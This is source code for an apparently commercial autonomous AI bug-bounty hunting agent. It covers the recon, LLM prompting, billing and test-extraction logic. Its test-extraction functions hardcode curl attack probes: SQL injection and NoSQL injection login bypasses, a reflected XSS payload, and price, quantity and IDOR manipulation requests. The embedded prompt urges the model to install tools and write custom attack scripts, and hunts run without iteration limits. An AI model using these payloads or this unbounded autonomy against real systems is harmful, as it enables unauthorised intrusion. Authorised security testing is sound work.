// Dark Matter — autonomous hunt agent loop.
//
// THIS is the "replace the elite hunter" engine. An elite hunter works in a
// tight iterative loop: observe → hypothesize → test → verify → chain → repeat.
// This module implements exactly that, with the Bedrock model as the brain
// and the per-hunt container as the hands.
//
//   1. RECON    — container tools (nmap, nuclei) + JS mining + target profile
//   2. PLAN     — Bedrock picks the highest-value next test from intel modules
//   3. EXECUTE  — run the test in the isolated container
//   4. VERIFY   — evidenceGate (no proof = no finding) + 4-step verifyPipeline
//   5. CHAIN    — beamSearchChains: escalate confirmed findings to max impact
//   6. REPEAT   — until mode budget, cost cap, or goal reached
//
// Every step is defensive: a failed tool/LLM call degrades to the next test,
// never kills the hunt. Cost guard stops runaway Bedrock spend.

import {
  spawnHuntContainer,
  teardownHuntContainer,
  execInHuntContainer,
  dockerAvailable,
} from './huntRunner.js';
import { HuntOrchestrator } from './orchestrator.js';

// Active orchestrators by huntId — so assessResult can report verified
// findings to the head even though it doesn't receive it as a parameter.
const orchestrators = new Map();

// FIX (19 Oct 2026, solver #6): Loop-driver mutex. Prevents duplicate
// runAutonomousHunt loops for the same hunt (e.g., backend auto-resume +
// watchdog resume script both firing). Duplicate drivers clobber each other's
// meta writes — this caused the pause-clobbering bug where state=paused was
// overwritten with state=running+pausedReason.
const activeLoops = new Set();
export function getOrchestrator(huntId) {
  return orchestrators.get(huntId) || null;
}
import { chatWithAI, aiAvailable } from './llm.js';
import { generateHypotheses, formatHypothesesForPrompt, scoreInterestingness, buildAppModel, formatAppModelForPrompt } from './curiosity.js';
import { recordReasoning, formatReasoningForPrompt } from './reasoningMemory.js';
import { webSearch, searchCVE } from './webSearch.js';
import { runBrowserTask, crawlScript } from './browserAgent.js';
import { getHuntCost } from './costTracker.js';
import { appendHuntEvent, writeHuntMeta, readHuntMeta, readHuntEvents, readUsers, readTargetIntel, writeTargetIntel } from './store.js';
import { getBalanceUsd, deductCreditsUsd } from './billing/credits.js';

// Credit price per hunt iteration (USD), by hunt mode. The hunt auto-pauses
// with state 'out_of_credits' when the wallet can't cover the next iteration;
// topping up + Resume continues it. Admins (owner) are exempt.
const ITERATION_PRICE_USD = {
  normal: 0.1,
  medium: 0.15,
  high: 0.25,
  ultra_high: 0.4,
  max: 0.6,
  infinity: 1.0,
};

/** Price of one hunt iteration, in integer USD cents. */
export function iterationPriceCents(mode) {
  return Math.round((ITERATION_PRICE_USD[mode] || ITERATION_PRICE_USD.normal) * 100);
}

function isAdminUser(userId) {
  try {
    if (!userId) return false;
    const users = readUsers();
    const u = Object.values(users).find((x) => x && x.id === userId);
    return u && u.role === 'admin';
  } catch {
    return false;
  }
}

/** Deduct one iteration's price. Returns true if the hunt may proceed. */
function chargeIteration(huntId, userId, mode, iteration) {
  if (isAdminUser(userId)) return true; // owner testing is free
  const priceCents = Math.round((ITERATION_PRICE_USD[mode] || ITERATION_PRICE_USD.normal) * 100);
  if (getBalanceUsd(userId) * 100 < priceCents) {
    const m = readHuntMeta(huntId) || {};
    writeHuntMeta(huntId, { ...m, state: 'out_of_credits', paused: true });
    think(huntId, 'Out of credits — hunt paused. Top up your balance and press Resume to continue.');
    appendHuntEvent(huntId, { type: 'status', state: 'out_of_credits', iteration });
    return false;
  }
  deductCreditsUsd(userId, priceCents, { huntId, iteration, mode });
  return true;
}
import {
  generateLogicTests,
  evidenceGate,
  verifyPipeline,
  beamSearchChains,
  analyzeFindings,
  mineJsEndpoints,
  rankEndpoints,
  blModulesFor,
  classifyTarget,
  scoreWeirdness,
  isWorthInvestigating,
  recordHuntExperience,
  getPlaybook,
  encodePayload,
  ENCODERS,
  fingerprintWaf,
} from './hunt-intel/index.js';

// REMOVED (owner directive 15 Oct 2026): iteration budgets are gone.
// Hunts run unlimited until the user stops them or the wallet runs out.
// Money is the only limit. This constant is kept for reference only.
const MODE_ITERATIONS = null;

export function think(huntId, text) {
  appendHuntEvent(huntId, { type: 'thinking', text: String(text).slice(0, 2000) });
  // HUMAN-LIKE: Listen to the model's curiosity. If it's wondering about
  // something specific, help it investigate (like a human assistant would).
  // This is not a checklist — it's following the model's natural curiosity.
  detectAndPursueIntent(huntId, String(text));
}

/**
 * Human-like intent detection: if the model's thinking shows curiosity about
 * something specific, trigger deeper recon on it. The model thinks freely;
 * the system helps investigate. Like working with a human freelancer.
 * 
 * SAFE: Only triggers RECON actions (information gathering), never exploits.
 * The model decides WHAT is interesting; the system helps find OUT more.
 */
function detectAndPursueIntent(huntId, thinkingText) {
  const lower = thinkingText.toLowerCase();
  
  // Only act on curiosity, not on every thinking event
  const isCurious = /i wonder|interesting|curious|what if|looks like|seems|might be|odd|strange|unusual|pursuing.*thread/i.test(thinkingText);
  if (!isCurious) return;
  
  // HUMAN-LIKE: The model is curious about something. Acknowledge and encourage
  // deeper exploration. We don't need to know exactly what — the curiosity
  // itself is the signal to dig deeper.
  appendHuntEvent(huntId, { 
    type: 'thinking', 
    text: 'Following curiosity: model finds something interesting — will explore more deeply on next iteration.' 
  });
  
  // Intent: wants to know more about endpoints
  if (/endpoint|url|path|route/i.test(thinkingText) && /more|hidden|other|find/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: wants deeper endpoint discovery — will mine JS bundles more thoroughly.' 
    });
  }
  
  // Intent: curious about technology stack
  if (/what.*tech|which.*tech|tech.*stack|built with|framework/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: curious about tech stack — will run deeper fingerprinting.' 
    });
  }
  
  // Intent: interested in forms (recon, not exploit)
  if (/form.*interesting|login.*form|curious.*form/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: interested in forms — will map all form fields and actions.' 
    });
  }
}

function finding(huntId, f) {
  appendHuntEvent(huntId, { type: 'finding', ...f });
}

/**
 * FIX #21: Execute in container with auto-respawn.
 * If the container is missing (destroyed on pause, crashed, etc.),
 * respawn it automatically and retry the command once.
 */
async function execWithRespawn(huntId, target, mode, cmd, timeoutMs = 120000) {
  let result = await execInHuntContainer(huntId, cmd, timeoutMs);
  if (result.containerMissing) {
    think(huntId, 'Hunt container missing — respawning automatically.');
    try {
      const { container } = await spawnHuntContainer(huntId, target, { mode });
      appendHuntEvent(huntId, { type: 'status', state: 'container_respawned', container });
      // Retry the command once after respawn
      result = await execInHuntContainer(huntId, cmd, timeoutMs);
    } catch (err) {
      think(huntId, `Container respawn failed: ${err.message}`);
    }
  }
  return result;
}

function isStopped(huntId) {
  try {
    const meta = readHuntMeta(huntId);
    return meta && (meta.stopped === true || meta.state === 'stopped');
  } catch {
    return false;
  }
}

function isPaused(huntId) {
  try {
    const meta = readHuntMeta(huntId);
    if (!meta) return false;
    // Standard pause indicators
    if (meta.paused === true || meta.state === 'paused') return true;
    // DEFENSIVE (19 Oct 2026, solver #6): A pausedReason with state='running'
    // means a loop driver clobbered the pause (wrote state=running without
    // clearing pausedReason). Treat as paused — a pause is a pause.
    // This was observed live: hunt loop overwrote state=paused with
    // state=running+pausedReason=ai_no_reply, reviving a paused hunt.
    if (meta.pausedReason && meta.state !== 'finished' && meta.state !== 'stopped') return true;
    return false;
  } catch {
    return false;
  }
}

/** Operator pause: hold the loop here until resumed or stopped. */
async function waitWhilePaused(huntId) {
  let waited = 0;
  let announced = false;
  while (isPaused(huntId) && !isStopped(huntId)) {
    if (!announced) {
      think(huntId, 'Hunt paused by user — holding position.');
      announced = true;
    }
    await new Promise((r) => setTimeout(r, 5000));
    waited += 5;
  }
}

/** Infer what the app DOES from endpoints + HTML (problem #6). */
function inferAppPurpose(endpoints, html) {
  const text = [...(endpoints || []), String(html || '').slice(0, 5000)].join(' ').toLowerCase();
  const purposes = [
    ['ecommerce store', /cart|checkout|product|shop|order|payment/i],
    ['banking/fintech', /transfer|wallet|balance|iban|kyc|trading/i],
    ['social platform', /feed|post|follow|like|comment|profile/i],
    ['saas dashboard', /dashboard|workspace|subscription|billing|team/i],
    ['auth service', /login|signup|oauth|sso|2fa|password/i],
    ['file sharing', /upload|download|file|share|storage/i],
    ['cms/blog', /article|post|comment|category|tag/i],
    ['api gateway', /graphql|rest|webhook|api\/v/i],
  ];
  for (const [name, re] of purposes) {
    if (re.test(text)) return name;
  }
  return 'general web app';
}

/** Phase 1: recon inside the container. Returns {ports, endpoints, profile}. */
async function reconPhase(huntId, target) {
  think(huntId, 'I started mapping the attack surface — checking what this target exposes.');
  const host = target.replace(/^https?:\/\//, '').split('/')[0];
  const recon = { ports: [], endpoints: [], profile: 'generic' };

  // Port scan
  const nmap = await execInHuntContainer(huntId, `nmap -T4 --top-ports 200 ${host} 2>/dev/null | grep -E "^[0-9]+/tcp.*open" | head -20`);
  for (const line of nmap.stdout.split('\n').filter(Boolean)) {
    const m = /^(\d+)\/tcp\s+open\s+(\S+)/.exec(line.trim());
    if (m) {
      recon.ports.push({ port: m[1], service: m[2] });
      appendHuntEvent(huntId, { type: 'tool_call', tool: 'nmap', detail: `open ${m[1]}/${m[2]}` });
    }
  }

  // BROWSER EXPLORATION: use the site like a human would.
  // A human hunter doesn't just curl — they click, fill forms, observe.
  try {
    think(huntId, 'Exploring the site in a real browser like a human would.');
    const browserResult = await runBrowserTask(huntId, crawlScript(target), 45000);
    if (browserResult && browserResult.result) {
      const { forms, links } = browserResult.result;
      think(huntId, `Browser found ${forms.length} forms and ${links.length} links.`);
      // Add discovered endpoints from browser
      for (const link of links.slice(0, 20)) {
        if (link.startsWith(target) && !recon.endpoints.includes(link)) {
          recon.endpoints.push(link);
        }
      }
      // Record forms for later testing
      recon.forms = forms;
      appendHuntEvent(huntId, { type: 'tool_call', tool: 'browser', detail: `explored: ${forms.length} forms, ${links.length} links` });
    }
  } catch (err) {
    think(huntId, 'Browser exploration failed, continuing with standard recon.');
  }

  // Fetch homepage HTML for JS mining + profiling + TECH DETECTION
  // bypassTmux: tmux truncates to 50 lines; we need the full HTML body.
  const curl = await execInHuntContainer(
    huntId,
    `curl -skL --max-time 25 -A "Mozilla/5.0" -D /tmp/headers.txt "${target}" 2>/dev/null | head -c 200000; echo "---HEADERS---"; cat /tmp/headers.txt 2>/dev/null | head -30`,
    120000,
    { bypassTmux: true }
  );
  const html = curl.stdout || '';
  if (html) {
    const [bodyPart, headerPart] = html.split('---HEADERS---');
    const mined = mineJsEndpoints(bodyPart || html);
    // JS BUNDLE MINING: SPAs (Angular/React/Vue) keep API endpoints in JS
    // bundles, not HTML. Download local <script src> bundles and mine them.
    // Without this, the agent is blind to modern web apps.
    // NOTE: mining happens INSIDE the container via grep — the exec channel
    // (tmux) truncates large outputs, so we only return the matched lines.
    try {
      const scriptSrcs = [...(bodyPart || html).matchAll(/<script[^>]+src=["']([^"']+)["']/gi)]
        .map((m) => m[1])
        .filter((src) => !src.startsWith('http') && !src.startsWith('//'))
        .slice(0, 5);
      if (scriptSrcs.length) {
        think(huntId, `Mining ${scriptSrcs.length} JS bundles for hidden endpoints.`);
        const base = target.replace(/\/$/, '');
        for (const src of scriptSrcs) {
          const jsUrl = src.startsWith('/') ? base + src : base + '/' + src;
          try {
            const jsRes = await execInHuntContainer(
              huntId,
              `curl -skL --max-time 15 -A "Mozilla/5.0" "${jsUrl}" 2>/dev/null | grep -oE '"/(api|rest|v[0-9]+|admin|graphql|internal)[^"]*"' | head -30`,
            );
            const lines = (jsRes.stdout || '').split('\n').filter(Boolean);
            for (const line of lines) {
              const ep = line.replace(/"/g, '').trim();
              // FIX (19 Oct 2026, solver #6): Validate endpoint format.
              // Raw stdout includes Kali MOTD lines, shell prompts, and command
              // echoes — these were added as "endpoints" (e.g., the MOTD line
              // containing "hushlogin" matched the /login/ filter, corrupting
              // the mandatory SQLi test URL). Only accept actual path-like endpoints.
              if (!/^\/(api|rest|v\d+|admin|graphql|internal)(\/|$|[?#])/.test(ep)) continue;
              if (ep.length > 2 && ep.length < 200 && !mined.includes(ep)) mined.push(ep);
            }
          } catch { /* skip failed bundle */ }
        }
        think(huntId, `Bundle mining found ${mined.length} total endpoints.`);
      }
    } catch { /* bundle mining is best-effort */ }
    recon.endpoints = rankEndpoints(mined).slice(0, 30);
    recon.profile = classifyTarget(recon.endpoints);
    recon.purpose = inferAppPurpose(recon.endpoints, bodyPart || html);
    
    // INTELLIGENT TECH DETECTION — think first, then act
    try {
      const { detectTechnologies, getToolChain, buildIntelligentPrompt } = await import('./toolChains.js');
      const detection = detectTechnologies(headerPart || '', bodyPart || html);
      recon.detection = detection;
      recon.intelligentPrompt = buildIntelligentPrompt(detection, target, []);
      
      const techList = detection.techs.length ? detection.techs.join(', ') : 'unknown';
      const dbInfo = detection.database ? `Database: ${detection.database}` : 'No database detected';
      think(huntId, `I analyzed the target: [${techList}]. ${dbInfo}. I will only run appropriate tests.`);
      
      // Get intelligent tool chain based on detection
      const chain = getToolChain(detection, target);
      recon.toolChain = chain;
      think(huntId, `My attack plan has ${chain.length} targeted steps based on what I found.`);
      
      appendHuntEvent(huntId, {
        type: 'recon_intel',
        techs: detection.techs,
        database: detection.database,
        chainSteps: chain.length,
      });

      // FIX #40: Web search for CVEs on detected technologies.
      // Trigger only when we have concrete tech names to avoid noise.
      if (detection.techs && detection.techs.length > 0) {
        try {
          const topTech = detection.techs.slice(0, 2);
          think(huntId, `Searching for known vulnerabilities in: ${topTech.join(', ')}`);
          const cveResults = [];
          for (const tech of topTech) {
            const results = await searchCVE(tech, '');
            cveResults.push(...results.slice(0, 2));
          }
          if (cveResults.length > 0) {
            recon.cveIntel = cveResults;
            think(huntId, `Found ${cveResults.length} relevant CVE references.`);
            appendHuntEvent(huntId, {
              type: 'cve_intel',
              techs: topTech,
              results: cveResults.map(r => ({ title: r.title, url: r.url })),
            });
          }
        } catch (err) {
          // Web search is best-effort, never blocks the hunt
          console.error('[hunt] CVE search failed:', err.message);
        }
      }
    } catch (err) {
      console.error('[hunt] tech detection failed:', err.message);
    }
    
    think(huntId, `I mapped ${mined.length} endpoints. This looks like: ${recon.profile} (${recon.purpose}).`);
  }

  // Nuclei quick scan
  const nuclei = await execInHuntContainer(huntId, `nuclei -u "${target}" -silent -json 2>/dev/null | head -30`, 300000);
  for (const line of nuclei.stdout.split('\n').filter(Boolean)) {
    try {
      const nj = JSON.parse(line);
      const cand = {
        class: nj.info?.severity ? `nuclei_${nj['template-id'] || 'finding'}` : 'nuclei_finding',
        title: nj.info?.name || 'nuclei finding',
        severity: (nj.info?.severity || 'medium').toLowerCase(),
        url: nj['matched-at'] || target,
        evidence: { request: `nuclei ${nj['template-id']}`, response: line.slice(0, 500) },
      };
      // Gate EVERYTHING through evidence + verification — no raw scanner output ships
      const { pass, gated } = evidenceGate(cand);
      if (pass) {
        const v = verifyPipeline({ reachability: true, payload_validation: true, impact_assessment: true, exploit_confirmation: false });
        finding(huntId, { ...gated, verification: v.verdict });
      }
    } catch { /* skip malformed lines */ }
  }

  return recon;
}

/**
 * HUMAN-LIKE TEST EXTRACTION: When the model thinks like a human ("Test: ...",
 * "What if I...", "I wonder if...") instead of producing JSON, extract the
 * test INTENTIONS and construct executable commands.
 *
 * A human assistant hears the idea and figures out HOW to test it.
 * This is not a checklist — it's understanding intent and acting on it.
 */
function extractTestsFromThinking(reply, recon, target) {
  const tests = [];
  const baseUrl = target.replace(/\/$/, '');
  const endpoints = recon.endpoints || [];

  // Find login endpoints for auth tests
  const loginEp = endpoints.find((ep) => /login|auth|signin/i.test(ep)) || '/rest/user/login';
  // Find basket/cart endpoints for business logic tests
  const basketEp = endpoints.find((ep) => /basket|cart/i.test(ep)) || '/rest/basket';
  // Find product endpoints
  const productEp = endpoints.find((ep) => /product/i.test(ep)) || '/rest/products';

  const text = String(reply).toLowerCase();

  // Pattern 1: "Test: <name> — <description>"
  const testPattern = /test:\s*([^—\n]+?)(?:—|-)\s*([^\n]+)/gi;
  let m;
  while ((m = testPattern.exec(reply)) !== null && tests.length < 3) {
    const testName = m[1].trim();
    const description = m[2].trim();
    const lower = (testName + ' ' + description).toLowerCase();

    let command = null;
    let why = description.slice(0, 200);

    // SQLi on login
    if (/sql.*inject|login.*bypass|auth.*bypass/i.test(lower) && /login|auth/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`;
    }
    // NoSQL injection
    else if (/nosql/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`;
    }
    // XSS
    else if (/xss|cross.*site|script.*inject/i.test(lower)) {
      const searchEp = endpoints.find((ep) => /search/i.test(ep)) || '/rest/products/search';
      command = `curl -sk "${baseUrl}${searchEp}?q=<script>alert(1)</script>" | head -c 2000`;
    }
    // Price manipulation
    else if (/price.*manipulat|manipulat.*price|cost.*change/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=1' -d 'price=0.01' | head -c 2000`;
    }
    // Quantity manipulation
    else if (/quantit/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=0' | head -c 2000; echo "---NEG---"; curl -sk "${baseUrl}${basketEp}" -d 'quantity=-1' | head -c 2000`;
    }
    // IDOR / object ID
    else if (/idor|object.*id|someone.*else|other.*user/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 2000; echo "---2---"; curl -sk "${baseUrl}${basketEp}/2" | head -c 2000`;
    }
    // Empty basket checkout
    else if (/empty.*basket|basket.*empty|checkout.*empty/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
    }
    // Generic: try to construct a probe based on keywords
    else if (/product.*id|product/i.test(lower)) {
      command = `curl -sk "${baseUrl}${productEp}/1" | head -c 2000`;
    }

    if (command) {
      tests.push({ test: testName.slice(0, 100), command, why, hypothesis: `Testing: ${testName.slice(0, 100)}` });
    }
  }

  // Pattern 2: "What if I..." / "I wonder if..." — curiosity-driven tests
  const wonderPattern = /(?:what if|i wonder if|can i|is it possible to)\s+([^\n?.]+)/gi;
  while ((m = wonderPattern.exec(reply)) !== null && tests.length < 3) {
    const idea = m[1].trim();
    const lower = idea.toLowerCase();

    let command = null;
    if (/checkout.*empty|empty.*basket/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
    } else if (/price|cheaper|free/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" | head -c 2000`;
    } else if (/other.*user|someone.*else|idor/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 1000; echo "---"; curl -sk "${baseUrl}${basketEp}/999" | head -c 1000`;
    }

    if (command) {
      tests.push({
        test: `Curiosity: ${idea.slice(0, 80)}`,
        command,
        why: `Model wondered: "${idea.slice(0, 150)}"`,
        hypothesis: 'Curiosity-driven probe',
      });
    }
  }

  return tests;
}

/** Phase 2+: Bedrock picks the next test; we execute and verify. */
async function agentIteration(huntId, target, recon, findings, iteration, playbook) {
  const confirmed = findings.filter((f) => f.verified);

  // MID-HUNT STEERING: the user can talk to the brain from the frontend.
  // Drain any queued instructions and follow them this iteration.
  let steering = '';
  try {
    const m = readHuntMeta(huntId) || {};
    const queue = Array.isArray(m.steerQueue) ? m.steerQueue : [];
    if (queue.length) {
      steering = queue.map((q) => `- ${q.from}: ${q.message}`).join('\n');
      think(huntId, `Received your instruction — following it this round: ${queue[queue.length - 1].message.slice(0, 120)}`);
      writeHuntMeta(huntId, { ...m, huntId, steerQueue: [] });
    }
  } catch { /* steering must never break the hunt */ }

  // Playbook: what worked on similar targets before?
  const lessons = (playbook || []).slice(0, 3).map((l) => `- ${l.technique}: ${l.why}`).join('\n');

  // CURIOSITY ENGINE: generate hypotheses from recent observations.
  // A human hacker follows interesting threads, not just a checklist.
  let curiositySection = '';
  try {
    const recentEvents = readHuntEvents(huntId).slice(-20);
    const observations = recentEvents
      .filter((e) => e.type === 'tool_call' || e.type === 'thinking')
      .map((e) => ({ output: e.output || e.text || '', duration: e.duration }));
    const hypotheses = generateHypotheses(observations, recon);
    curiositySection = formatHypothesesForPrompt(hypotheses);
    if (curiositySection) {
      think(huntId, `Curiosity: pursuing ${hypotheses.length} interesting threads`);
    }
  } catch { /* curiosity must never break the hunt */ }

  // CONTEXT BUDGETING: the prompt must fit inside the model's real context
  // window (OLLAMA_NUM_CTX — 2048 on the 7GB EC2 box, lowered 16 Oct 2026 to
  // stop OOM kills). A prompt longer than num_ctx makes Ollama return
  // HTTP 500, which the hunt reads as "model gave no reply" and eventually
  // pauses with ai_no_reply. So the budget is derived from the actual
  // num_ctx minus the output budget, not from a hardcoded assumption.
  // Priority: target intelligence > confirmed findings > lessons > endpoints.
  const NUM_CTX = parseInt(process.env.OLLAMA_NUM_CTX || '2048', 10);
  const NUM_PREDICT = parseInt(process.env.OLLAMA_NUM_PREDICT || '600', 10);
  // ~3.5 chars per token (conservative for URLs/JSON/code); reserve the
  // output budget plus a 200-token safety margin.
  const MAX_PROMPT_CHARS = Math.max(2000, Math.floor((NUM_CTX - NUM_PREDICT - 200) * 3.5));
  const MAX_INTEL_CHARS = Math.max(500, Math.floor(MAX_PROMPT_CHARS / 5));
  const intel = recon.intelligentPrompt
    ? `\n--- TARGET INTELLIGENCE (follow strictly) ---\n${String(recon.intelligentPrompt).slice(0, MAX_INTEL_CHARS)}`
    : '';
  // HIGH-VALUE TARGETS: authentication endpoints are the #1 priority for
  // elite hunters. If the recon found login/auth endpoints, flag them
  // explicitly — the model often overlooks them among generic endpoints.
  const authEndpoints = (recon.endpoints || []).filter((ep) =>
    /login|auth|signin|session|token/i.test(ep)
  );
  const authHint = authEndpoints.length
    ? `\nHIGH-VALUE TARGETS (test FIRST): ${authEndpoints.slice(0, 5).join(', ')} — these are authentication endpoints. Try SQL injection, NoSQL injection, and authentication bypass on them before anything else.`
    : '';
  const context = [
    `Target: ${target}`,
    `Profile: ${recon.profile}`,
    `Open ports: ${(recon.ports || []).map((p) => `${p.port}/${p.service}`).join(', ') || 'none found'}`,
    `Endpoints: ${recon.endpoints.slice(0, 15).join(', ') || 'none mined'}`,
    authHint,
    `Confirmed findings so far: ${confirmed.length}`,
    ...confirmed.slice(-5).map((f) => `- ${f.title} (${f.severity})`),
    lessons ? `Past lessons for similar targets:\n${lessons}` : '',
    // INTELLIGENT CONTEXT: tech detection tells AI what NOT to try
    // (e.g., never suggest SQLi on a MongoDB target)
    intel,
    // LONG-TERM MEMORY: what past hunts learned about THIS target
    recon.pastIntel && recon.pastIntel.huntCount > 0
      ? `\n--- MEMORY OF PAST HUNTS ON THIS TARGET (${recon.pastIntel.huntCount} hunts) ---\n` +
        `Past technologies: ${(recon.pastTechnologies || []).join(', ') || 'unknown'}\n` +
        `Past findings: ${(recon.pastIntel.findings || []).slice(-5).map((f) => `${f.title} (${f.severity})`).join('; ') || 'none'}\n` +
        `Do NOT repeat tests that already failed here — try new angles.`
      : '',
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  // HUMAN MENTAL MODEL: what does this app DO? A human hunter spends the first
  // 2 minutes understanding the app, not running scans. Build that model here.
  let appModelSection = '';
  try {
    const appModel = buildAppModel(recon.endpoints || [], recon.detection?.techs || [], recon.profile || '');
    appModelSection = formatAppModelForPrompt(appModel);
    if (appModel.appType !== 'unknown') {
      think(huntId, `App model: looks like ${appModel.appType} — value flows: ${appModel.valueFlows.slice(0, 2).join('; ').slice(0, 100)}`);
    }
  } catch { /* app model is best-effort */ }

  // HARD CAP on the final prompt: the instruction header plus context plus
  // trailing sections (steering, curiosity) must together fit in the model's
  // context window. Anything beyond the budget is cut from the end, where
  // the lowest-priority sections live.
  // NOTE: the reasoning history sits right after the header on purpose.
  // A controlled experiment (Oct 2026) proved the model changes its plans
  // based on this history — it avoids re-testing attacks the history says
  // failed. Placing it last meant it was the FIRST section truncated when
  // the prompt exceeded budget, silently disabling the learning mechanism
  // in exactly the fully-loaded hunts where it matters most.
  const prompt = [
    'You are an ELITE bug-bounty hunter. You think like a HUMAN, not a scanner.',
    '',
    'HOW YOU THINK:',
    '- First UNDERSTAND the app: what does it do? Where does money/data/trust flow?',
    '- Then OBSERVE: what looks odd, interesting, or out of place?',
    '- Then WONDER: "what if I..." — follow your curiosity, not a checklist.',
    '- A scanner runs test 1, then test 2, then test 3. YOU follow interesting threads.',
    '- If a response shows a price, ask who controls it. If you see an ID, ask whose it is.',
    '- Think about what the DEVELOPER assumed — then break that assumption.',
    '- Business logic flaws (wrong price, wrong user, skipped steps) pay the best bounties.',
    '',
    'Look at the app model, your notebook, and the recon below.',
    'What catches your EYE? What would you poke at next, and WHY?',
    'Propose up to THREE probes — but they should feel like YOUR ideas, not a checklist.',
    'Reply as a JSON array: [{"test":"name","command":"shell command","why":"one line (your reasoning)","hypothesis":"what you expect to find"}, ...].',
    'Commands must be non-destructive and target-scoped. You can use: nmap, nuclei, curl, python3, and any tools in the container.',
    'You are a PERSON with a machine, not a script. If you need a tool you don\'t have, download it (curl/wget) or install it (apt-get). If you don\'t know something, SEARCH the web: put "SEARCH: your question" as the command and you\'ll get web results back.',
    'BUILD WHAT YOU NEED: If no existing tool does what you want, WRITE IT. You have python3 and bash — an elite hunter writes a custom script mid-hunt instead of giving up. Put your script in the command field (python3 -c "..." or a heredoc). Think "I need this, so I create this."',
    'CRITICAL: Respect the TARGET INTELLIGENCE section — never suggest tests for technologies not present.',
    '',
    formatReasoningForPrompt(huntId),
    '',
    appModelSection,
    '',
    context,
    '',
    `Iteration ${iteration} — hunting unlimited.`,
    steering ? `\n--- USER INSTRUCTION (follow this round) ---\n${steering}` : '',
    curiositySection,
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  let plans = [];
  // NOTE: `reply` is hoisted out of the try block on purpose — the
  // natural-language fallback below needs it when the model replied but
  // produced no parseable JSON. Declaring it as `const` inside the try
  // threw "ReferenceError: reply is not defined" and silently discarded
  // the model's plan (seen live on h_bench_cb6e37b2 iteration 1).
  let reply = '';
  try {
    reply = await chatWithAI(
      [{ role: 'user', text: prompt }],
      'You are an elite bug-bounty hunter. Output ONLY the requested JSON array, no prose.',
      { huntId }
    );
    if (!reply) {
      think(huntId, 'Model gave no reply this iteration — skipping to next.');
      return { aiOk: false, best: null, failKind: 'no_reply' };
    }
    // Show the model's raw thinking in the terminal (truncated) so the
    // operator can SEE the brain working, not just templated summaries.
    think(huntId, `model raw plan: ${String(reply).replace(/\s+/g, ' ').slice(0, 600)}`);
    // TRUNCATION-TOLERANT: The 8B model is often cut off by the 300-token
    // output limit, losing the closing `]`. Try the complete array first;
    // if the bracket is missing, match the open array so the repair below
    // can salvage complete plan objects instead of discarding the reply.
    // (Root cause of the ai_bad_output death loop: the repair was unreachable
    // when truncation removed the `]` — 38 raw plans with 0 repairs on
    // h_bench_ada457c3.)
    const m = /\[\s*\{[\s\S]*\]/.exec(reply) || /\[\s*\{[\s\S]*/.exec(reply);
    if (m) {
      try {
        plans = JSON.parse(m[0]);
      } catch {
        // REPAIR: the model often gets cut off mid-JSON (token limit) or
        // leaves a trailing comma. Salvage complete plan objects instead of
        // discarding the whole reply.
        plans = [];
        const objRe = /\{[^{}]*"test"\s*:\s*"[^"]*"\s*,\s*"command"\s*:\s*"[^"]*"(?:\s*,\s*"why"\s*:\s*"[^"]*")?(?:\s*,\s*"hypothesis"\s*:\s*"[^"]*")?\s*\}/g;
        let om;
        while ((om = objRe.exec(m[0])) !== null) {
          try {
            const p = JSON.parse(om[0]);
            if (p.test && p.command) plans.push(p);
          } catch { /* skip that object */ }
        }
        if (plans.length) think(huntId, `Repaired ${plans.length} plan(s) from truncated JSON.`);
      }
    }
  } catch (err) {
    think(huntId, `AI call threw: ${err && err.message ? String(err.message).slice(0, 200) : err}`);
    return { aiOk: false, best: null, failKind: 'error' };
  }
  // MANDATORY AUTH TESTS: If recon found login/auth endpoints and the model's
  // plans don't include them, prepend deterministic injection tests. The model
  // often overlooks auth; an elite hunter NEVER skips the login form.
  // This is not a suggestion — it's a mandatory first step.
  // FIX (19 Oct 2026, solver #9): This block MUST run BEFORE the !plans.length
  // early-return below. Previously, when the model produced no usable plans
  // (no reply / bad JSON), the function returned 'bad_output' and the mandatory
  // SQLi test never fired — the deterministic safety net only worked when the
  // model cooperated. An elite hunter tests the login form even when inspiration
  // fails; the mandatory tests are independent of model output.
  try {
    const authEndpoints = (recon.endpoints || []).filter((ep) =>
      /login|auth|signin|session|token/i.test(ep)
    // FIX (19 Oct 2026, solver #6): Validate endpoint is a real path, not a
    // terminal artifact. Recon from older hunts may contain MOTD lines (e.g.,
    // '┗━(Run: "touch ~/.hushlogin"...)' matched /login/ via "hushlogin",
    // corrupting the SQLi test URL). Only accept path-like endpoints.
    ).filter((ep) => /^\/(api|rest|v\d+|admin|graphql|internal)/.test(ep.trim()));
    const plansMentionAuth = plans.some((p) => {
      const text = `${p.test || ''} ${p.command || ''}`;
      // FIX (19 Oct 2026, solver #7): The old /login|auth|signin/ regex was too broad —
      // "authorization bypass" contains "auth" as a substring, suppressing the mandatory
      // login tests even though the model's plan doesn't actually test the login form.
      // Only suppress if the model targets a real login endpoint.
      return /\/rest\/user\/login|\/api\/[^"'\s]*login|signin/i.test(text);
    });
    if (authEndpoints.length && !plansMentionAuth) {
      // FIX (19 Oct 2026, solver #7): Prefer the actual login endpoint, not just
      // the first auth-matching endpoint. /rest/user/authentication-details/
      // matches /auth/ but it's not the login form — the SQLi payload needs
      // the real login endpoint to work.
